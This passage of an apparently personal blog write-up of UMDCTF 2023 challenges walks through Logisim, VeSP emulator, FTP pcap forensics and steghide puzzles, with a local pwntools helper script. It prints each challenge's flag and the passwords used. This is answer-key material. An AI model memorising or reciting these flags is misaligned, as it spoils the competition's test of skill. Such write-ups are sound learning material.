&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(690,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(710,200)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(710,260)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(720,260)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(720,230)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(720,260)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(720,230)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(730,230)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(730,210)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(730,230)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;circuit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;project&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The solution, the header contains the github link to the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;logisim-evolution&#x2F;&quot;&gt;logisim&lt;&#x2F;a&gt; software. Downloaded the &lt;code&gt;logisim-evolution-3.8.0-all.jar&lt;&#x2F;code&gt; file and runned it locally. And Opened the &lt;code&gt;beep1.circ&lt;&#x2F;code&gt; file in the software and loaded the &lt;code&gt;flag.enc&lt;&#x2F;code&gt; file in the ROM. And started the simmulation then the flag is displayed in the TTY.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_beep11.png&quot; class=&quot;autoimg&quot;&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: UMDCTF{w3lc0me_t0_l0g1s1m_yeet}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;clutter&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#clutter&quot; aria-label=&quot;Anchor link for: clutter&quot;&gt;clutter&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_clutter.png&quot; alt=&quot;clutter&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge has two files &lt;a&gt;clutter.vsp&lt;&#x2F;a&gt; and a pdf about the installation of &lt;code&gt;VeSP&lt;&#x2F;code&gt; software.&lt;&#x2F;p&gt;
&lt;p&gt;The clutter.vsp is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;2000
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;2001
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;2001
&lt;&#x2F;span&gt;&lt;span&gt;0003
&lt;&#x2F;span&gt;&lt;span&gt;2000
&lt;&#x2F;span&gt;&lt;span&gt;0052
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;315B
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;2001
&lt;&#x2F;span&gt;&lt;span&gt;0008
&lt;&#x2F;span&gt;&lt;span&gt;2000
&lt;&#x2F;span&gt;&lt;span&gt;0045
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;3285
&lt;&#x2F;span&gt;&lt;span&gt;0000
&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span&gt;..
&lt;&#x2F;span&gt;&lt;span&gt;and upto 215 lines
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Solution,&lt;&#x2F;p&gt;
&lt;p&gt;Installed and started the VeSP&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;clutter$&lt;&#x2F;span&gt;&lt;span&gt; wget https:&#x2F;&#x2F;user.eng.umd.edu&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\~&lt;&#x2F;span&gt;&lt;span&gt;yavuz&#x2F;teaching&#x2F;courses&#x2F;enee350&#x2F;vesp-source-code&#x2F;vesp1.1X&#x2F;main.cpp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -o&lt;&#x2F;span&gt;&lt;span&gt; vesp1_1.cpp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;clutter$&lt;&#x2F;span&gt;&lt;span&gt; cpp vesp1_1.cpp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -o&lt;&#x2F;span&gt;&lt;span&gt; vesp1_1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;clutter$&lt;&#x2F;span&gt;&lt;span&gt; ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vesp1_1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;clutter$&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;vesp1_1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to Vesp 1.1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Type 
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt; to enter a program
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt; to display registers
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt; to display memory: 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, I followed the instructions and loaded the &lt;code&gt;clutter.vsp&lt;&#x2F;code&gt; file in the vesp1_1 program. After running the program with long trace(in verbose mode). I found some memory storage locations in every instruction execution like this &lt;code&gt;Memory[0001] = 000A&lt;&#x2F;code&gt;. After observing all the same memory location values I got to know that flag characters are stored in memory locations other than &lt;code&gt;0000&lt;&#x2F;code&gt; and &lt;code&gt;0001&lt;&#x2F;code&gt;. I couldn&#x27;t found any way to store the output of the program to a file so I wrote this automated script using &lt;code&gt;pwntools&lt;&#x2F;code&gt;. Cool, Right!&lt;&#x2F;p&gt;
&lt;p&gt;solve.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;vesp&#x2F;vesp1_1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;002&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;clutter&#x2F;clutter.vsp&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;output &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;The number of clock cycles used = 396&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;utf-8&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;regex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Memory&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#fa6e32;color:#ffffff;&quot;&gt;\[\w&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#fa6e32;color:#ffffff;&quot;&gt;\]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; = .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{4}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;findall&lt;&#x2F;span&gt;&lt;span&gt;(regex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;output)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;match:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0000&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not in &lt;&#x2F;span&gt;&lt;span&gt;i) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0001&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not in &lt;&#x2F;span&gt;&lt;span&gt;i):
&lt;&#x2F;span&gt;&lt;span&gt;        x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;i[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        di &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(di)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# UMDCTF{Ux13-us3-m3m0ry-w1p3!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag: UMDCTF{Ux13-us3-m3m0ry-w1p3!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics&quot; aria-label=&quot;Anchor link for: forensics&quot;&gt;Forensics&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;fire-type-pokemons-only&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#fire-type-pokemons-only&quot; aria-label=&quot;Anchor link for: fire-type-pokemons-only&quot;&gt;Fire Type Pokemons Only&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_ftpo.png&quot; alt=&quot;firetype&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached file : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;umdctf23&#x2F;fire-type-pokemon-only.pcapng.zip&quot;&gt;fire-type-pokemon-only.pcapng.zip&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Without opening the pcap file I know that I had to look for &lt;code&gt;FTP&lt;&#x2F;code&gt; packets in the file. So I extracted the zip and opened the pcap file in wireshark.&lt;&#x2F;p&gt;
&lt;p&gt;Solution&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Opened the pcap in wireshark&lt;&#x2F;li&gt;
&lt;li&gt;Filtered FTP packets in wireshark&lt;&#x2F;li&gt;
&lt;li&gt;Followed the TCP stream of FTP data&lt;&#x2F;li&gt;
&lt;li&gt;Found a password &lt;code&gt;piku&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Some Images are transfered over network&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, I just exported the FTP-DATA saved the files. The files are &lt;code&gt;Diglett.png&lt;&#x2F;code&gt; , &lt;code&gt;secretpic1.png&lt;&#x2F;code&gt;, &lt;code&gt;hmmmm&lt;&#x2F;code&gt; and &lt;code&gt;secret.zip&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The zip is password protected, I used &lt;code&gt;piku&lt;&#x2F;code&gt; as the password for the zip. A video file is extracted, the flag is diplayed in the video.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_ftpoflag.png&quot; alt=&quot;firetype&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{its_n0t_p1kachu!!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;no-352&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#no-352&quot; aria-label=&quot;Anchor link for: no-352&quot;&gt;No. 352&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_no352.png&quot; alt=&quot;352&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A &lt;a&gt;hide-n-seek.jpg&lt;&#x2F;a&gt; file is attached&lt;&#x2F;p&gt;
&lt;p&gt;Used Steghide immediately&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;First password &lt;code&gt;kecleon&lt;&#x2F;code&gt; (from google search)&lt;&#x2F;li&gt;
&lt;li&gt;Second password &lt;code&gt;timetofindwhatkecleonishiding&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;no352$&lt;&#x2F;span&gt;&lt;span&gt; steghide extract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -sf&lt;&#x2F;span&gt;&lt;span&gt; hide-n-seek.jpg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; passphrase : kecleon
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extracted&lt;&#x2F;span&gt;&lt;span&gt; data kecleon.jpg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;no352$&lt;&#x2F;span&gt;&lt;span&gt; steghide extract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -sf&lt;&#x2F;span&gt;&lt;span&gt; kecleon.jpg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; passphrase : timetofindwhatkecleonishiding
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extracted&lt;&#x2F;span&gt;&lt;span&gt; data wrote to flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;no352$&lt;&#x2F;span&gt;&lt;span&gt; cat flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;UMDCTF{KECLE0NNNNN&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{KECLE0NNNNN}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
